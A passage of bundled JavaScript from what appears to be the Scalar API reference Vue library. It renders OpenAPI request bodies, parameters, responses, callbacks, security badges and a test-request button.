				__props.requestBody.content?.[selectedContentType.value]?.itemSchema && !__props.requestBody.content?.[selectedContentType.value]?.schema ? (openBlock(), createElementBlock("p", _hoisted_7$4, toDisplayString(unref(translate)("common.streamItem")), 1)) : createCommentVNode("", true),
				__props.requestBody.content?.[selectedContentType.value]?.schema && __props.requestBody.content?.[selectedContentType.value]?.itemSchema ? (openBlock(), createBlock(unref(Schema_default), {
					key: 1,
					compact: "",
					eventBus: __props.eventBus,
					name: unref(translate)("common.streamItem"),
					noncollapsible: "",
					options: {
						...__props.options,
						hideReadOnly: true,
						document: __props.document
					},
					schema: unref(getResolvedRef)(__props.requestBody.content[selectedContentType.value]?.itemSchema),
					schemaContext: "requestBody"
				}, null, 8, [
					"eventBus",
					"name",
					"options",
					"schema"
				])) : createCommentVNode("", true),
				partitionedSchema.value ? (openBlock(), createElementBlock("div", _hoisted_8$4, [createVNode(unref(Schema_default), {
					breadcrumb: __props.breadcrumb,
					compact: "",
					compositionPath: ["requestBody"],
					eventBus: __props.eventBus,
					name: unref(translate)("operation.requestBody"),
					noncollapsible: "",
					options: {
						hideReadOnly: true,
						orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst,
						orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
						expandAllSchemaProperties: __props.options.expandAllSchemaProperties,
						schemaKeyboardNav: __props.options.schemaKeyboardNav,
						hideModels: __props.options.hideModels,
						document: __props.document
					},
					schema: partitionedSchema.value.visibleProperties,
					schemaContext: "requestBody"
				}, null, 8, [
					"breadcrumb",
					"eventBus",
					"name",
					"options",
					"schema"
				]), createVNode(unref(Schema_default), {
					additionalProperties: "",
					breadcrumb: __props.breadcrumb,
					compact: "",
					compositionPath: ["requestBody"],
					eventBus: __props.eventBus,
					hideDescription: "",
					name: unref(translate)("operation.requestBody"),
					options: {
						hideReadOnly: true,
						orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst,
						orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
						expandAllSchemaProperties: __props.options.expandAllSchemaProperties,
						schemaKeyboardNav: __props.options.schemaKeyboardNav,
						hideModels: __props.options.hideModels,
						document: __props.document
					},
					schema: partitionedSchema.value.collapsedProperties,
					schemaContext: "requestBody"
				}, null, 8, [
					"breadcrumb",
					"eventBus",
					"name",
					"options",
					"schema"
				])])) : schema.value ? (openBlock(), createElementBlock("div", _hoisted_9$3, [createVNode(unref(Schema_default), {
					breadcrumb: __props.breadcrumb,
					compact: "",
					compositionPath: ["requestBody"],
					eventBus: __props.eventBus,
					hideReadOnly: true,
					name: unref(translate)("operation.requestBody"),
					noncollapsible: "",
					options: {
						hideReadOnly: true,
						orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst,
						orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
						expandAllSchemaProperties: __props.options.expandAllSchemaProperties,
						schemaKeyboardNav: __props.options.schemaKeyboardNav,
						hideModels: __props.options.hideModels,
						document: __props.document
					},
					schema: schema.value,
					schemaContext: "requestBody"
				}, null, 8, [
					"breadcrumb",
					"eventBus",
					"name",
					"options",
					"schema"
				])])) : createCommentVNode("", true)
			], 8, _hoisted_1$33)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-ea2c19bd"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/OperationParameters.vue.js
var OperationParameters_default = /* @__PURE__ */ defineComponent({
	__name: "OperationParameters",
	props: /*@__PURE__*/ mergeModels({
		breadcrumb: {},
		parameters: { default: () => [] },
		requestBody: {},
		eventBus: {},
		document: {},
		options: {}
	}, {
		"selectedContentType": {},
		"selectedContentTypeModifiers": {}
	}),
	emits: ["update:selectedContentType"],
	setup(__props) {
		const { translate } = useLocalization();
		/** Thread the selected request body content type up to the layout */
		const selectedContentType = useModel(__props, "selectedContentType");
		const splitParameters = computed(() => (__props.parameters ?? []).reduce((acc, p) => {
			const parameter = getResolvedRef(p);
			if (parameter && !isHidden(parameter)) flattenDeepObjectQueryParameter(parameter).forEach((flattenedParameter) => {
				acc[flattenedParameter.in === "querystring" ? "query" : flattenedParameter.in].push(flattenedParameter);
			});
			return acc;
		}, {
			cookie: [],
			header: [],
			path: [],
			query: []
		}));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [
				createVNode(ParameterList_default, {
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "path"] : void 0,
					collapsableItems: __props.options.expandAllParameters === false,
					document: __props.document,
					eventBus: __props.eventBus,
					options: __props.options,
					parameters: splitParameters.value["path"]
				}, {
					title: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.pathParameters")), 1)]),
					_: 1
				}, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"options",
					"parameters"
				]),
				createVNode(ParameterList_default, {
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "query"] : void 0,
					collapsableItems: __props.options.expandAllParameters === false,
					document: __props.document,
					eventBus: __props.eventBus,
					options: __props.options,
					parameters: splitParameters.value["query"]
				}, {
					title: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.queryParameters")), 1)]),
					_: 1
				}, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"options",
					"parameters"
				]),
				createVNode(ParameterList_default, {
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "headers"] : void 0,
					collapsableItems: __props.options.expandAllParameters === false,
					document: __props.document,
					eventBus: __props.eventBus,
					options: __props.options,
					parameters: splitParameters.value["header"]
				}, {
					title: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.headers")), 1)]),
					_: 1
				}, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"options",
					"parameters"
				]),
				createVNode(ParameterList_default, {
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "cookies"] : void 0,
					collapsableItems: __props.options.expandAllParameters === false,
					document: __props.document,
					eventBus: __props.eventBus,
					options: __props.options,
					parameters: splitParameters.value["cookie"]
				}, {
					title: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.cookies")), 1)]),
					_: 1
				}, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"options",
					"parameters"
				]),
				__props.requestBody ? (openBlock(), createBlock(RequestBody_default, {
					key: 0,
					selectedContentType: selectedContentType.value,
					"onUpdate:selectedContentType": _cache[0] || (_cache[0] = ($event) => selectedContentType.value = $event),
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "body"] : void 0,
					document: __props.document,
					eventBus: __props.eventBus,
					options: __props.options,
					requestBody: __props.requestBody
				}, {
					title: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.body")), 1)]),
					_: 1
				}, 8, [
					"selectedContentType",
					"breadcrumb",
					"document",
					"eventBus",
					"options",
					"requestBody"
				])) : createCommentVNode("", true)
			], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/OperationResponses.vue.script.js
var _hoisted_1$32 = {
	key: 0,
	class: "mt-6"
};
var _hoisted_2$18 = ["aria-label"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/OperationResponses.vue.js
var OperationResponses_default = /* @__PURE__ */ defineComponent({
	__name: "OperationResponses",
	props: {
		responses: {},
		breadcrumb: {},
		collapsableItems: { type: Boolean },
		eventBus: {},
		document: {},
		selectedContentTypes: { default: () => ({}) },
		options: {}
	},
	emits: ["update:selectedContentTypes"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const { translate } = useLocalization();
		const resolvedResponses = computed(() => Object.fromEntries(Object.entries(__props.responses ?? {}).flatMap(([status, response]) => {
			const resolved = getResolvedRef(response);
			return resolved ? [[status, resolved]] : [];
		})));
		const { level: headingLevel } = useDocumentOutline("operationSection");
		return (_ctx, _cache) => {
			return Object.keys(resolvedResponses.value).length ? (openBlock(), createElementBlock("div", _hoisted_1$32, [createVNode(unref(SectionHeaderTag_default), {
				class: "text-c-1 responses-title--tree mt-3 mb-0 block! leading-[1.45] font-medium",
				level: unref(headingLevel),
				rule: ""
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.responses")), 1)]),
				_: 1
			}, 8, ["level"]), createBaseVNode("ul", {
				"aria-label": unref(translate)("operation.responses"),
				class: "responses-list--tree mb-3 list-none p-0 text-sm",
				role: "list"
			}, [(openBlock(true), createElementBlock(Fragment, null, renderList(resolvedResponses.value, (response, status) => {
				return openBlock(), createBlock(ParameterListItem_default, {
					key: status,
					breadcrumb: __props.breadcrumb ? [...__props.breadcrumb, "responses"] : void 0,
					collapsableItems: __props.collapsableItems,
					document: __props.document,
					eventBus: __props.eventBus,
					name: status,
					options: __props.options,
					parameter: response,
					"onUpdate:selectedContentType": (type) => emit("update:selectedContentTypes", {
						...__props.selectedContentTypes,
						[status]: type
					})
				}, null, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"name",
					"options",
					"parameter",
					"onUpdate:selectedContentType"
				]);
			}), 128))], 8, _hoisted_2$18)])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/callbacks/Callback.vue.script.js
var _hoisted_1$31 = { class: "callback-list-item callback-list-item--tree" };
var _hoisted_2$17 = ["aria-controls", "aria-expanded"];
var _hoisted_3$12 = { class: "callback-item-name relative flex min-w-0 flex-1 items-baseline gap-1.5" };
var _hoisted_4$6 = { class: "text-c-1 min-w-0 flex-1 truncate font-bold" };
var _hoisted_5$5 = { class: "text-c-2 font-normal" };
var _hoisted_6$4 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/callbacks/Callback.vue.js
var Callback_default = /* @__PURE__ */ defineComponent({
	__name: "Callback",
	props: {
		callback: {},
		method: {},
		name: {},
		url: {},
		eventBus: {},
		document: {},
		breadcrumb: {},
		options: {}
	},
	setup(__props) {
		/**
		* A controlled disclosure keyed to the breadcrumb, so deep links can open the
		* callback and its state survives remounts like any other node.
		*/
		const expansion = useSchemaExpansion();
		const anonymousKey = useId();
		const nodeKey = computed(() => toNodeKey(__props.breadcrumb) || `~anonymous-${anonymousKey}`);
		const panelId = useId();
		const isOpen = computed(() => expansion.isExpanded(nodeKey.value, {}));
		const toggle = () => {
			expansion.setExpanded(nodeKey.value, !isOpen.value);
		};
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$31, [createBaseVNode("button", {
				"aria-controls": isOpen.value ? unref(panelId) : void 0,
				"aria-expanded": isOpen.value,
				class: "callback-item-trigger group/tree-control font-code flex w-full cursor-pointer items-baseline gap-1.5 border-none bg-transparent p-0 py-2.5 text-start text-sm leading-(--scalar-line-height-5)",
				type: "button",
				onClick: toggle
			}, [createBaseVNode("span", _hoisted_3$12, [
				createVNode(SchemaGlyphPuck_default, {
					anchor: "line",
					class: "callback-item-glyph",
					open: isOpen.value
				}, null, 8, ["open"]),
				createVNode(unref(HttpMethod_default), {
					as: "span",
					class: "request-method font-bold",
					method: __props.method
				}, null, 8, ["method"]),
				createBaseVNode("span", _hoisted_4$6, [createTextVNode(toDisplayString(__props.name) + " ", 1), createBaseVNode("span", _hoisted_5$5, toDisplayString(__props.url), 1)])
			])], 8, _hoisted_2$17), isOpen.value ? (openBlock(), createElementBlock("div", {
				key: 0,
				id: unref(panelId),
				class: "callback-operation-panel mt-1.5 mb-0.5 flex flex-col gap-6 [&_.parameter-list-title--tree]:mt-0! [&_.parameter-list-title--tree]:text-(length:--scalar-font-size-4)! [&_.parameter-list-title--tree]:font-(--scalar-bold)! [&_.request-body]:mt-0! [&_.request-body-description]:mt-0! [&_.request-body-description]:text-(length:--scalar-font-size-4)! [&_.request-body-header]:mt-0! [&_.request-body-title]:text-(length:--scalar-font-size-4)! [&_.request-body-title]:font-(--scalar-bold)! [&_.responses-title--tree]:mt-0! [&_.responses-title--tree]:text-(length:--scalar-font-size-4)! [&_.responses-title--tree]:font-(--scalar-bold)! [&>*]:mt-0!"
			}, [createVNode(OperationParameters_default, {
				breadcrumb: __props.breadcrumb,
				document: __props.document,
				eventBus: __props.eventBus,
				options: __props.options,
				parameters: __props.callback.parameters ?? [],
				requestBody: unref(getResolvedRef)(__props.callback.requestBody)
			}, null, 8, [
				"breadcrumb",
				"document",
				"eventBus",
				"options",
				"parameters",
				"requestBody"
			]), createVNode(OperationResponses_default, {
				breadcrumb: __props.breadcrumb,
				collapsableItems: false,
				document: __props.document,
				eventBus: __props.eventBus,
				options: __props.options,
				responses: __props.callback.responses
			}, null, 8, [
				"breadcrumb",
				"document",
				"eventBus",
				"options",
				"responses"
			])], 8, _hoisted_6$4)) : createCommentVNode("", true)]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/callbacks/Callbacks.vue.script.js
var _hoisted_1$30 = ["aria-label"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/callbacks/Callbacks.vue.js
var Callbacks_default = /* @__PURE__ */ defineComponent({
	__name: "Callbacks",
	props: {
		path: {},
		callbacks: {},
		eventBus: {},
		breadcrumb: {},
		document: {},
		options: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const { level: headingLevel } = useDocumentOutline("operationSection");
		const flattenedCallbacks = computed(() => {
			const _callbacks = [];
			objectEntries(__props.callbacks).forEach(([name, pathItem]) => {
				objectEntries(getResolvedRef(pathItem) ?? {}).forEach(([url, methods]) => {
					if (typeof methods !== "object" || !methods) return;
					forEachPathItemOperation(methods, (callbackMethod, callback) => {
						const resolvedCallback = getResolvedRef(callback);
						if (!resolvedCallback) return;
						_callbacks.push({
							name,
							url,
							method: callbackMethod,
							callback: resolvedCallback
						});
					});
				});
			});
			return _callbacks;
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				"aria-label": unref(translate)("operation.callbacks"),
				class: "callbacks-list gap-3",
				role: "group"
			}, [createVNode(unref(SectionHeaderTag_default), {
				class: "callbacks-title text-c-1 callbacks-title--tree mt-3 mb-0 block! text-lg font-medium",
				level: unref(headingLevel),
				rule: ""
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.callbacks")), 1)]),
				_: 1
			}, 8, ["level"]), (openBlock(true), createElementBlock(Fragment, null, renderList(flattenedCallbacks.value, ({ callback, method, name, url }) => {
				return openBlock(), createBlock(Callback_default, {
					key: `${name}-${url}-${method}`,
					breadcrumb: __props.breadcrumb ? [
						...__props.breadcrumb,
						"callbacks",
						name,
						url,
						...unref(isHttpMethod)(method) ? [method] : ["additionalOperations", method]
					] : void 0,
					callback,
					document: __props.document,
					eventBus: __props.eventBus,
					method,
					name,
					options: __props.options,
					path: __props.path,
					url
				}, null, 8, [
					"breadcrumb",
					"callback",
					"document",
					"eventBus",
					"method",
					"name",
					"options",
					"path",
					"url"
				]);
			}), 128))], 8, _hoisted_1$30);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/CopyMarkdownButton.vue.script.js
var _hoisted_1$29 = { "aria-live": "polite" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/CopyMarkdownButton.vue.js
var CopyMarkdownButton_default = /* @__PURE__ */ defineComponent({
	__name: "CopyMarkdownButton",
	props: {
		document: {},
		path: {},
		method: {},
		isWebhook: { type: Boolean }
	},
	setup(__props) {
		const { translate } = useLocalization();
		const { toast } = useToasts();
		const copied = ref(false);
		const copying = ref(false);
		const active = ref(true);
		const icon = computed(() => copied.value ? ScalarIconCheck_default : ScalarIconCopy_default);
		const label = computed(() => copied.value ? translate("actions.copied") : translate("actions.copyAsMarkdown"));
		onScopeDispose(() => active.value = false);
		const { start, stop } = useTimeoutFn(() => copied.value = false, 1e3, { immediate: false });
		watch(() => [
			__props.document,
			__props.path,
			__props.method,
			__props.isWebhook
		], () => {
			stop();
			copied.value = false;
		});
		const copyMarkdown = async () => {
			if (copying.value) return;
			copying.value = true;
			copied.value = false;
			try {
				if (!navigator.clipboard) throw new Error("Clipboard is unavailable");
				const selection = __props.isWebhook ? { webhook: {
					name: __props.path,
					method: __props.method
				} } : { operation: {
					path: __props.path,
					method: __props.method
				} };
				const source = __props.document;
				const sourcePath = __props.path;
				const sourceMethod = __props.method;
				const sourceIsWebhook = __props.isWebhook;
				const markdown = import("./browser-CAmp_qbI.js").then(({ createMarkdownFromOpenApi }) => createMarkdownFromOpenApi(source, selection));
				if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
					const blob = markdown.then((text) => new Blob([text], { type: "text/plain" }));
					blob.catch(() => {});
					await navigator.clipboard.write([new ClipboardItem({ "text/plain": blob })]);
				} else await navigator.clipboard.writeText(await markdown);
				if (active.value && __props.document === source && __props.path === sourcePath && __props.method === sourceMethod && __props.isWebhook === sourceIsWebhook) {
					copied.value = true;
					start();
				}
			} catch {
				if (active.value) toast(translate("actions.copyMarkdownFailed"), "error");
			} finally {
				copying.value = false;
			}
		};
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarButton_default), {
				class: "h-6 shrink-0 px-2",
				disabled: copying.value,
				icon: icon.value,
				size: "sm",
				variant: "outlined",
				onClick: withModifiers(copyMarkdown, ["stop"])
			}, {
				default: withCtx(() => [createBaseVNode("span", _hoisted_1$29, toDisplayString(label.value), 1)]),
				_: 1
			}, 8, ["disabled", "icon"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/SecurityRequirementBadgeScheme.vue.script.js
var _hoisted_1$28 = { class: "flex min-w-0 flex-col gap-1.5" };
var _hoisted_2$16 = { class: "flex flex-wrap items-baseline gap-x-2 gap-y-1" };
var _hoisted_3$11 = {
	key: 0,
	class: "text-c-2"
};
var _hoisted_4$5 = { key: 0 };
var _hoisted_5$4 = {
	key: 2,
	class: "flex flex-col gap-1"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/SecurityRequirementBadgeScheme.vue.js
var SecurityRequirementBadgeScheme_default = /* @__PURE__ */ defineComponent({
	__name: "SecurityRequirementBadgeScheme",
	props: { scheme: {} },
	setup(__props) {
		const { translate } = useLocalization();
		const typeLabel = computed(() => {
			const definition = __props.scheme.scheme;
			switch (definition?.type) {
				case "apiKey": return translate("authentication.apiKey");
				case "http": return `HTTP ${definition.scheme}`;
				case "oauth2": return "OAuth 2.0";
				case "openIdConnect": return "OpenID Connect";
				case "mutualTLS": return translate("authentication.mutualTLS");
				default: return;
			}
		});
		const apiKeyInstruction = computed(() => {
			const definition = __props.scheme.scheme;
			if (definition?.type !== "apiKey") return;
			const params = { name: definition.name };
			switch (definition.in) {
				case "cookie": return translate("authentication.apiKeyCookie", params);
				case "header": return translate("authentication.apiKeyHeader", params);
				case "query": return translate("authentication.apiKeyQuery", params);
				default: return;
			}
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("li", _hoisted_1$28, [
				createBaseVNode("div", _hoisted_2$16, [createBaseVNode("span", { class: normalizeClass(["font-medium", { "line-through": __props.scheme.scheme?.deprecated }]) }, toDisplayString(__props.scheme.name), 3), typeLabel.value ? (openBlock(), createElementBlock("span", _hoisted_3$11, toDisplayString(typeLabel.value), 1)) : createCommentVNode("", true)]),
				apiKeyInstruction.value ? (openBlock(), createElementBlock("p", _hoisted_4$5, toDisplayString(apiKeyInstruction.value), 1)) : createCommentVNode("", true),
				__props.scheme.scheme?.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
					key: 1,
					class: "text-c-2",
					value: __props.scheme.scheme.description
				}, null, 8, ["value"])) : createCommentVNode("", true),
				__props.scheme.scopes.length ? (openBlock(), createElementBlock("ul", _hoisted_5$4, [(openBlock(true), createElementBlock(Fragment, null, renderList(__props.scheme.scopes, (scope) => {
					return openBlock(), createElementBlock("li", {
						key: scope,
						class: "font-code text-c-2"
					}, toDisplayString(scope), 1);
				}), 128))])) : createCommentVNode("", true)
			]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/SecurityRequirementBadge.vue.script.js
var _hoisted_1$27 = ["aria-expanded", "aria-label"];
var _hoisted_2$15 = { key: 2 };
var _hoisted_3$10 = ["aria-label"];
var _hoisted_4$4 = { class: "flex max-h-[min(32rem,80dvh)] w-80 max-w-[calc(100vw-2rem)] flex-col gap-3 overflow-auto p-3 text-sm wrap-anywhere" };
var _hoisted_5$3 = { class: "font-medium" };
var _hoisted_6$3 = {
	key: 0,
	class: "text-c-2"
};
var _hoisted_7$3 = {
	key: 1,
	class: "flex flex-col gap-3"
};
var _hoisted_8$3 = {
	key: 0,
	class: "text-c-2"
};
var _hoisted_9$2 = { class: "flex flex-col gap-3" };
var _hoisted_10$1 = {
	key: 2,
	class: "flex flex-col gap-3"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/SecurityRequirementBadge.vue.js
var SecurityRequirementBadge_default = /* @__PURE__ */ defineComponent({
	__name: "SecurityRequirementBadge",
	props: {
		requiredSecurity: {},
		hideLabel: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* The badge shows a small panel with the security details. It opens on hover
		* and on click, so we own the open state directly instead of leaning on a
		* click-only popover. Owning the state keeps the two interactions from fighting
		* each other: hover and the click of the same gesture (a tap fires both) can no
		* longer toggle each other off.
		*/
		const triggerRef = ref(null);
		const panelRef = ref(null);
		const isOpen = ref(false);
		/**
		* Whether the panel is pinned open by a click. A pinned panel ignores the
		* pointer leaving so it behaves like the old click-to-open popover, and it only
		* closes on another click, a click outside, or Escape.
		*/
		const isPinned = ref(false);
		let closeTimeout;
		/**
		* Close after a short delay so the pointer can travel across the gap between the
		* badge and the panel without the panel disappearing. A pinned panel stays open.
		*/
		const scheduleClose = () => {
			if (isPinned.value) return;
			clearTimeout(closeTimeout);
			closeTimeout = setTimeout(() => {
				isOpen.value = false;
			}, 120);
		};
		const cancelClose = () => clearTimeout(closeTimeout);
		const openOnHover = () => {
			cancelClose();
			isOpen.value = true;
		};
		const close = () => {
			cancelClose();
			isOpen.value = false;
			isPinned.value = false;
		};
		/**
		* Toggle on click. A hover already opened the panel (and a tap's `mouseenter`
		* fires just before its `click`), so the first click pins it open rather than
		* closing it; a click on an already pinned panel closes it.
		*/
		const toggleOnClick = () => {
			if (isPinned.value) {
				close();
				return;
			}
			cancelClose();
			isOpen.value = true;
			isPinned.value = true;
		};
		onClickOutside(triggerRef, close, { ignore: [panelRef] });
		onKeyStroke("Escape", () => {
			if (isOpen.value) {
				if (panelRef.value?.contains(document.activeElement)) triggerRef.value?.focus();
				close();
			}
		});
		onBeforeUnmount(() => clearTimeout(closeTimeout));
		const label = computed(() => __props.requiredSecurity.state === "required" ? translate("authentication.required") : translate("authentication.optional"));
		const verb = computed(() => __props.requiredSecurity.state === "required" ? translate("authentication.requires") : translate("authentication.accepts"));
		const panelLabel = computed(() => __props.requiredSecurity.state === "required" ? translate("authentication.detailsRequired") : translate("authentication.detailsOptional"));
		/** Single group with multiple schemes — all must be satisfied (AND). */
		const isAndGroup = computed(() => __props.requiredSecurity.requirements.length === 1 && (__props.requiredSecurity.requirements[0]?.schemes.length ?? 0) > 1);
		/** Multiple groups — any one group satisfies authentication (OR). */
		const isOrAlternatives = computed(() => __props.requiredSecurity.requirements.length > 1);
		return (_ctx, _cache) => {
			return __props.requiredSecurity.state !== "none" ? (openBlock(), createBlock(unref(ScalarFloating_default), {
				key: 0,
				placement: "bottom-end"
			}, {
				floating: withCtx(() => [isOpen.value ? (openBlock(), createElementBlock("div", {
					key: 0,
					ref_key: "panelRef",
					ref: panelRef,
					"aria-label": panelLabel.value,
					class: "relative flex flex-col p-0.75",
					role: "dialog",
					onClick: _cache[0] || (_cache[0] = withModifiers(() => {}, ["stop"])),
					onMouseenter: cancelClose,
					onMouseleave: scheduleClose
				}, [createBaseVNode("div", _hoisted_4$4, [
					createBaseVNode("div", _hoisted_5$3, toDisplayString(panelLabel.value), 1),
					isOrAlternatives.value || isAndGroup.value ? (openBlock(), createElementBlock("div", _hoisted_6$3, [createTextVNode(toDisplayString(verb.value) + " ", 1), isOrAlternatives.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createTextVNode(toDisplayString(unref(translate)("authentication.oneOf")), 1)], 64)) : isAndGroup.value ? (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(toDisplayString(unref(translate)("authentication.allOf")), 1)], 64)) : createCommentVNode("", true)])) : createCommentVNode("", true),
					isOrAlternatives.value ? (openBlock(), createElementBlock("ul", _hoisted_7$3, [(openBlock(true), createElementBlock(Fragment, null, renderList(__props.requiredSecurity.requirements, (group, gi) => {
						return openBlock(), createElementBlock("li", {
							key: gi,
							class: "flex flex-col gap-2 border-t pt-3"
						}, [group.schemes.length > 1 ? (openBlock(), createElementBlock("div", _hoisted_8$3, toDisplayString(verb.value) + " " + toDisplayString(unref(translate)("authentication.allOf")), 1)) : createCommentVNode("", true), createBaseVNode("ul", _hoisted_9$2, [(openBlock(true), createElementBlock(Fragment, null, renderList(group.schemes, (scheme, si) => {
							return openBlock(), createBlock(SecurityRequirementBadgeScheme_default, {
								key: si,
								scheme
							}, null, 8, ["scheme"]);
						}), 128))])]);
					}), 128))])) : __props.requiredSecurity.requirements[0] ? (openBlock(), createElementBlock("ul", _hoisted_10$1, [(openBlock(true), createElementBlock(Fragment, null, renderList(__props.requiredSecurity.requirements[0].schemes, (scheme, key) => {
						return openBlock(), createBlock(SecurityRequirementBadgeScheme_default, {
							key,
							scheme
						}, null, 8, ["scheme"]);
					}), 128))])) : createCommentVNode("", true)
				]), createVNode(unref(ScalarFloatingBackdrop_default))], 40, _hoisted_3$10)) : createCommentVNode("", true)]),
				default: withCtx(() => [createBaseVNode("button", {
					ref_key: "triggerRef",
					ref: triggerRef,
					"aria-expanded": isOpen.value,
					"aria-haspopup": "dialog",
					"aria-label": label.value,
					class: normalizeClass(["security-requirement-badge inline-flex w-fit shrink-0 items-center justify-center gap-1 text-sm", __props.requiredSecurity.state === "optional" ? "text-c-2" : "text-c-1 font-medium"]),
					type: "button",
					onClick: withModifiers(toggleOnClick, ["stop"]),
					onMouseenter: openOnHover,
					onMouseleave: scheduleClose
				}, [__props.requiredSecurity.state === "required" ? (openBlock(), createBlock(unref(ScalarIconLockSimple_default), {
					key: 0,
					class: "size-3",
					weight: "bold"
				})) : (openBlock(), createBlock(unref(ScalarIconLockSimpleOpen_default), {
					key: 1,
					class: "size-3",
					weight: "bold"
				})), !__props.hideLabel ? (openBlock(), createElementBlock("span", _hoisted_2$15, toDisplayString(label.value), 1)) : createCommentVNode("", true)], 42, _hoisted_1$27)]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/types/dist/legacy/reference-config.js
var XScalarStability;
(function(XScalarStability) {
	XScalarStability["Deprecated"] = "deprecated";
	XScalarStability["Experimental"] = "experimental";
	XScalarStability["Stable"] = "stable";
})(XScalarStability || (XScalarStability = {}));
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/helpers/operation-stability.js
/**
* Returns true if an operation is considered deprecated.
*/
var isOperationDeprecated = (operation) => operation.deprecated || operation["x-scalar-stability"] === XScalarStability.Deprecated;
/**
* Get operation stability from deprecated or x-scalar-stability
*/
var getOperationStability = (operation) => operation.deprecated ? XScalarStability.Deprecated : operation["x-scalar-stability"];
/**
* Get Operation stability tailwind color class
*/
var getOperationStabilityColor = (operation) => {
	switch (getOperationStability(operation)) {
		case XScalarStability.Deprecated: return "text-red";
		case XScalarStability.Experimental: return "text-orange";
		case XScalarStability.Stable: return "text-green";
		default: return "";
	}
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/test-request-button/TestRequestButton.vue.script.js
var _hoisted_1$26 = ["method"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/test-request-button/TestRequestButton.vue.js
var TestRequestButton_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "TestRequestButton",
	props: {
		id: {},
		method: {},
		path: {},
		eventBus: {},
		exampleName: {},
		requestBodyCompositionSelection: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/** Route via ID and optionally with example name */
		const handleClick = () => {
			const payload = {
				id: __props.id,
				...__props.exampleName && { exampleName: __props.exampleName },
				...__props.requestBodyCompositionSelection && Object.keys(__props.requestBodyCompositionSelection).length > 0 && { requestBodyCompositionSelection: __props.requestBodyCompositionSelection }
			};
			__props.eventBus.emit("ui:open:client-modal", payload);
		};
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", {
				class: "show-api-client-button",
				method: __props.method,
				type: "button",
				onClick: withModifiers(handleClick, ["stop"])
			}, [
				createVNode(unref(ScalarIconPlay_default), {
					class: "size-3",
					weight: "fill"
				}),
				createBaseVNode("span", null, toDisplayString(unref(translate)("operation.testRequest")), 1),
				createVNode(ScreenReader_default, null, {
					default: withCtx(() => [createTextVNode("(" + toDisplayString(__props.method) + " " + toDisplayString(__props.path) + ")", 1)]),
					_: 1
				})
			], 8, _hoisted_1$26);
		};
	}
}), [["__scopeId", "data-v-fd55f744"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/x-badges/XBadges.vue.js
var XBadges_default = /* @__PURE__ */ defineComponent({
	__name: "XBadges",
	props: {
		position: {},
		badges: {}
	},
	setup(__props) {
		const filteredBadges = computed(() => {
			if (Array.isArray(__props.badges)) return __props.badges.filter((badge) => badge.position === __props.position || __props.position === "after" && !badge.position);
			return [];
		});
		return (_ctx, _cache) => {
